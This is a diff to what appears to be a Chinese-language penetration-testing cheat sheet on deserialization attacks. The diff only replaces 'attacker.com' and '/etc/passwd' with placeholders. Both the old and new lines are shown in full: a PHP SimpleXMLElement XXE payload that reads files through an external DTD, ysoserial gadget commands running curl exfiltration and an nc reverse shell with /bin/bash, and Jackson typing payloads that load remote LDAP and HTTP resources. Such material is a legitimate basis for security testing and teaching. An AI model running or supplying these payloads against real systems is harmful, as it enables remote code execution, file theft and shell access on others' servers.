@@ -45,7 +45,7 @@
 *   **`SimpleXMLElement` 触发 XXE**：
     若反序列化输入会被转入 XML 节点处理，可以通过反序列化 `SimpleXMLElement` 引入外部实体（XXE），实现内网任意文件读取：
     ```php
-    $xxe = new SimpleXMLElement("<!DOCTYPE x [<!ENTITY % file SYSTEM 'php://filter/read=convert.base64-encode/resource=/etc/passwd'><!ENTITY % eval SYSTEM 'http://attacker.com/evil.xml'>%eval;]>", LIBXML_NOENT);
+    $xxe = new SimpleXMLElement("<!DOCTYPE x [<!ENTITY % file SYSTEM 'php://filter/read=convert.base64-encode/resource=<sensitive-file>'><!ENTITY % eval SYSTEM 'http://<attacker-domain>/evil.xml'>%eval;]>", LIBXML_NOENT);
     echo serialize($xxe);
     ```
 
@@ -121,13 +121,13 @@ Node.js 环境下的 `node-serialize` 库在进行反序列化时，若遇到符
 # 或 'aced0005' (hex)
 
 # ysoserial 常用 gadget 链
-java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/$(whoami)' | base64
+java -jar ysoserial.jar CommonsCollections6 'curl http://<attacker-domain>/$(whoami)' | base64
 java -jar ysoserial.jar CommonsBeanutils1 'touch /tmp/pwned' | base64
 java -jar ysoserial.jar Spring1 'id' | base64
-java -jar ysoserial.jar Groovy1 'nc attacker.com 4444 -e /bin/bash' | base64
+java -jar ysoserial.jar Groovy1 'nc <attacker-domain> 4444 -e /bin/bash' | base64
 
 # 检测: 先用 DNSLog gadget
-java -jar ysoserial.jar URLDNS 'http://UNIQUE.attacker.com' | base64
+java -jar ysoserial.jar URLDNS 'http://UNIQUE.<attacker-domain>' | base64
 # → DNS 收到请求 = 反序列化触发
 ```
 
@@ -252,8 +252,8 @@ YAML 反序列化 → 文件读取 → .env → 数据库密码 → 数据泄露
 
 ```json
 // Jackson enableDefaultTyping() → 任意类实例化
-["com.zaxxer.hikari.HikariConfig", {"metricRegistry": "ldap://attacker.com/exp"}]
-["org.springframework.context.support.ClassPathXmlApplicationContext", ["http://attacker.com/beans.xml"]]
+["com.zaxxer.hikari.HikariConfig", {"metricRegistry": "ldap://<attacker-domain>/exp"}]
+["org.springframework.context.support.ClassPathXmlApplicationContext", ["http://<attacker-domain>/beans.xml"]]
 ```
 
 ### Hessian Dubbo Gadget
